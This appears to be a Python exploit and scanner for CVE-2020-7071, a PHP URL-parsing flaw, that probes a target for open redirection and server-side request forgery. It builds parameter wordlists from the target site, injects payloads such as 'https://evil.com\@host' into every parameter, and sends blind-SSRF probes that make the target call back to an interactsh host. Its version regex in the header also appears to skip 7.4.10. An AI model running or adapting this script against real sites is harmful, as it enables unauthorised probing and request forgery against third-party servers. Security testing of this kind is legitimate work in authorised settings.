# PHP versions 7.3.x below 7.3.26, 7.4.x below 7.4.14 and 8.0.0

# Regex:
# ^7\.3\.(0|[1-9]|1[0-9]|2[0-5])$|^7\.4\.(0|[1-9]|1[1-3])$|^8\.0\.0$

# Open Redirection & Server Side Request Forgery


import requests
import argparse
import sys
import argparse
import random
import subprocess
import os
import time
from urllib.parse import urlparse



def create_wordlist(url):
    try:
        path = os.getcwd()
        ran = random.randint(1, 100000)
        file_path = os.path.join(path, "wordlist"+str(ran))
        
        try:
            with open(file_path, 'w') as file:
                print(f"\nCreating file in {file_path}...")
                time.sleep(1)
        except Exception:
            print(f"Error occured in progress of creating file")


        subprocess.run(
            ["cewler", "--output", f"{file_path}", url],
            check=True
        )
        
        with open(file_path, "r") as file:
            wordlist = [line.strip() for line in file if line.strip()]
        
        return wordlist

    except subprocess.CalledProcessError as e:
        print("Error occured in progress of cewler:", e)
        return []
    except FileNotFoundError:
        print(f"Error: The output file was not found.")
        return []
    
    
parser = argparse.ArgumentParser(usage="""CVE-2020-7071.py -u https://target.com/ -c""")
parser.add_argument('--URL', '-u', help='Target URL with parameter', required=True)
parser.add_argument('--custom', '-c', help='Use custom wordlist', action='store_true')
args = parser.parse_args()

#Parsing URL as host
parsed_url = urlparse(args.URL)
host = parsed_url.netloc


if args.custom:
    wordlist = input("\nPut your URL parameter wordlist: ")
    interactsh = input("Put your interactsh-url for Blind SSRF test: ")

    with open(wordlist, 'r') as file:
        for line in file:
            word = line.strip()  
            target_url = args.URL + "?" + word + "="  
            print("\n")
            print("-"*100)
            print(f"[O] Target parameter: {word}")
            
            try:
                test_urls = [f"https://evil.com\@{host}/aa.do", f"evil.com\@{host}/aa.do"]
                
                for test_url in test_urls:
                    print("\n[+] Testing URL => " + target_url + test_url)
                    response = requests.get(target_url+test_url)
                    if response.status_code == 302 or "evil.com" in response.text:
                        print("[+] It is vulnerable to Open Redirection & SSRF")
                        print("[Response in raw type]")
                        print(response.text)
                    
                    else:
                        print("[-] It is not vulnerable to Open Redirection & SSRF")
                        print("[+] Checking Blind SSRF....")
                        print("[+] Sending request for blind SSRf test. Check your server!!")
                        requests.get(target_url+f"{interactsh}\@{host}/aaa.do")

                    
            except requests.RequestException:
                print("(!) Error occured in progress")
                sys.exit()
            
else:
    wordlist = create_wordlist(host)
    
    for word in wordlist:
        target_url = args.URL + "?" + word + "="  
        print("\n")
        print("-"*100)
        print(f"[O] Target parameter: {word}")
        
        try:
            test_urls = [f"https://evil.com\@{host}/aa.do", f"evil.com\@{host}/aa.do"]
            
            for test_url in test_urls:
                print("\n[+] Testing URL => " + target_url + test_url)
                response = requests.get(target_url+test_url)
                if response.status_code == 302 or "evil.com" in response.text:
                    print("[+] Detected Vulnerability : True")
                
                else:
                    print("[-] Detected Vulnerability : False")
                
        except requests.RequestException:
            print("[!] Error occured in progress")
            sys.exit()